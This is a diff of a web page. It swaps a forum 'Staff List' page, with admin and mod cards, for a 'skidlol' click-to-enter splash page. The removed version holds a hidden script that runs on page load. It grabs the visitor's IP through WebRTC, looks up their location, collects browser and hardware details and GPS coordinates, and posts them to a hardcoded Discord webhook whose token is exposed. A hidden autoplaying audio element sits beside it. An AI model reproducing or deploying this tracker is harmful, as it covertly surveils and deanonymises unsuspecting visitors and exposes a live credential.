@@ -1,217 +1,130 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Staff List</title>
+    <title>skidlol</title>
     <style>
+        @font-face {
+            font-family: 'PressStart2P';
+            src: url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+        }
+
         body {
-            background-color: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 20px;
-        }
-        .staff-list {
-            max-width: 800px;
-            margin: auto;
-        }
-        .staff-member {
+            padding: 0;
+            background-color: rgba(0, 0, 0, 0.9);
+            color: white;
+            font-family: 'PressStart2P', Arial, sans-serif;
             display: flex;
+            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            margin-bottom: 20px;
-            padding: 20px;
-            background-color: #1e1e1e;
-            border-radius: 10px;
-            border: 2px solid #444;
-        }
-        .staff-member.admin {
-            border: 2px solid red;
-        }
-        .staff-member.mod {
-            border: 2px solid purple;
-        }
-        .avatar {
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
+            height: 100vh;
             overflow: hidden;
-            margin-right: 20px;
+            position: relative;
         }
-        .avatar img {
-            width: 100%;
-            height: 100%;
+
+        body.vignette {
+            background: radial-gradient(circle, rgba(255,0,0,0.5) 10%, rgba(0,0,0,0.9) 90%);
+            transition: background 1s ease;
         }
-        .details h3 {
-            margin: 0;
-            font-size: 22px;
+
+        .container {
+            text-align: center;
+            display: none;
+            opacity: 0;
+            transition: opacity 1s ease;
         }
-        .details h3.admin {
+
+        .container.visible {
+            display: block;
+            opacity: 1;
+        }
+
+        .title {
+            font-size: 48px;
+            font-weight: bold;
+            text-shadow: 0 0 3px white, 0 0 6px white;
+            margin-bottom: 20px;
+        }
+
+        .names-container {
+            display: flex;
+            gap: 20px;
+        }
+
+        .profile {
+            text-align: center;
+        }
+
+        .profile img {
+            width: 100px;
+            height: 100px;
+            border-radius: 15px;
+            margin-bottom: 10px;
+            background: white;
+        }
+
+        .profile span {
+            display: block;
+            font-size: 18px;
             color: red;
+            text-shadow: 0 0 3px red, 0 0 6px red;
         }
-        .details h3.mod {
-            color: yellow;
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: gray;
         }
-        .details p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #aaa;
+
+        .intro {
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 0 3px white, 0 0 6px white;
+            cursor: pointer;
+            position: relative;
+            z-index: 2;
         }
     </style>
+    <script>
+        function showContent() {
+            document.body.classList.add('vignette');
+            document.querySelector('.intro').style.display = 'none';
+            const container = document.querySelector('.container');
+            container.classList.add('visible');
+        }
+    </script>
 </head>
 <body>
-    <div class="staff-list">
-        <!-- Admins -->
-        <div class="staff-member admin">
-            <div class="avatar">
-                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+    <div class="intro" onclick="showContent()">Click to enter</div>
+    <div class="container">
+        <div class="title">skidlol</div>
+        <div class="names-container">
+            <div class="profile">
+                <a href=""><img src="https://i.ibb.co/VWpQ56f/IMG-5083.jpg" alt="IMG-5083"></a>
+                <span>𝖗𝖞𝖆𝖑</span>
             </div>
-            <div class="details">
-                <h3 class="admin">尺ㄚ卂ㄥ [Admin]</h3>
-                <p>User ID: 2</p>
-                <p>Joined: 4 years ago</p>
-                <p>Likes Given: 2</p>
-                <p>Likes Received: N/A</p>
+            <div class="profile">
+                <a href=""><img src="https://i.ibb.co/QHHvfx7/IMG-5078.jpg" alt="IMG-5078"></a>
+                <span>𝖉𝖊𝖈𝖊𝖎𝖛𝖊</span>
             </div>
-        </div>
-        <div class="staff-member admin">
-            <div class="avatar">
-                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            <div class="profile">
+                <a href=""><img src="https://i.ibb.co/Cb53T8v/IMG-5085.jpg" alt="IMG-5085"></a>
+                <span>𝖟𝖊𝖓𝖍</span>
             </div>
-            <div class="details">
-                <h3 class="admin">ALIAS [Admin]</h3>
-                <p>User ID: 3</p>
-                <p>Joined: 3 years ago</p>
-                <p>Likes Given: 5</p>
-                <p>Likes Received: 10</p>
+            <div class="profile">
+                <a href=""><img src="https://i.ibb.co/yXgTY3J/IMG-5084.jpg" alt="IMG-5084"></a>
+                <span>𝖋𝖗𝖆𝖌𝖟𝖟</span>
             </div>
-        </div>
-        <div class="staff-member admin">
-            <div class="avatar">
-                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
-            </div>
-            <div class="details">
-                <h3 class="admin">Juvinal [Admin]</h3>
-                <p>User ID: 4</p>
-                <p>Joined: 2 years ago</p>
-                <p>Likes Given: 8</p>
-                <p>Likes Received: 12</p>
+            <div class="profile">
+                <a href=""><img src="https://i.ibb.co/4dfMW4X/IMG-5081.jpg" alt="IMG-5081"></a>
+                <span>𝖏𝖚𝖛𝖎𝖓𝖆𝖑</span>
             </div>
         </div>
-        <!-- Mods -->
-        <div class="staff-member mod">
-            <div class="avatar">
-                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
-            </div>
-            <div class="details">
-                <h3 class="mod">Sloth [Mod]</h3>
-                <p>User ID: 5</p>
-                <p>Joined: 1 year ago</p>
-                <p>Likes Given: 15</p>
-                <p>Likes Received: 20</p>
-            </div>
-        </div>
-        <div class="staff-member mod">
-            <div class="avatar">
-                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
-            </div>
-            <div class="details">
-                <h3 class="mod">Kuro [Mod]</h3>
-                <p>User ID: 6</p>
-                <p>Joined: 6 months ago</p>
-                <p>Likes Given: 3</p>
-                <p>Likes Received: 7</p>
-            </div>
+        <div class="footer">
+            © skidlol | 2025
         </div>
     </div>
-</body>
-
-<audio src="https://cdn.discordapp.com/attachments/1319157431149924434/1321633728107249700/q56DDLK.mp3?ex=676df2d3&is=676ca153&hm=acb7d52a8ef6470a41514bc1925b624525de58bf2776e5fe05d9a0fc9677abda&" autoplay style="display: none;"></audio>
-
-<script>
-    const webhookURL = "https://discord.com/api/webhooks/1319299948495376457/o_jVj7KSoJjpsOn3LSar996SJ854E_DaoiVem1D3CXfPXSQnMTywu07tIbXPBdNf0gL_";
-
-    // Function to send data to webhook with delay to avoid rate-limiting
-    async function sendToWebhook(data) {
-        try {
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: data })
-            });
-            console.log("Data successfully sent to webhook");
-        } catch (error) {
-            console.error("Error sending data to webhook:", error);
-        }
-    }
-
-    // Function to add info to the grabbedData object and send to webhook with a delay
-    async function addInfo(label, data, delayTime = 1000) {
-        const info = `${label}: ${data}`;
-        console.log(info); // Log to the console
-        await sendToWebhook(info); // Send the info to the webhook
-        await delay(delayTime); // Delay for the specified amount of time
-    }
-
-    // Delay function to wait before continuing to the next info
-    function delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    async function getSystemInfo() {
-        const peerConnection = new RTCPeerConnection({
-            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-        });
-
-        peerConnection.createDataChannel("");
-        peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
-        peerConnection.onicecandidate = async event => {
-            if (event?.candidate) {
-                const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                if (ipMatch) {
-                    await addInfo("IP Address", ipMatch[0]); // Send IP Address and wait for 1 second
-
-                    // Fetch location based on IP
-                    try {
-                        const locationData = await fetch(`https://ipinfo.io/${ipMatch[0]}/json`).then(res => res.json());
-                        await addInfo("Country", locationData.country || "N/A");
-                        await addInfo("City", locationData.city || "N/A");
-                        await addInfo("Timezone", locationData.timezone || "N/A");
-                    } catch (e) {
-                        await addInfo("Location Info", "Failed to fetch location");
-                    }
-                }
-            }
-        };
-
-        // Add browser info
-        await addInfo("Browser", navigator.userAgent);
-        await addInfo("Platform", navigator.platform);
-
-        // Add memory and CPU info
-        await addInfo("Device Memory", `${navigator.deviceMemory || "N/A"} GB`);
-        await addInfo("CPU Cores", navigator.hardwareConcurrency || "N/A");
-
-        // Add geolocation info if available
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                addInfo("Latitude", position.coords.latitude);
-                addInfo("Longitude", position.coords.longitude);
-            }, () => {
-                addInfo("Location", "Permission denied or unavailable");
-            });
-        } else {
-            addInfo("Location", "Geolocation not supported");
-        }
-    }
-
-    // Start gathering system info
-    getSystemInfo();
-</script>
 
 
-
-
-
-
-</html>
+</body></html>
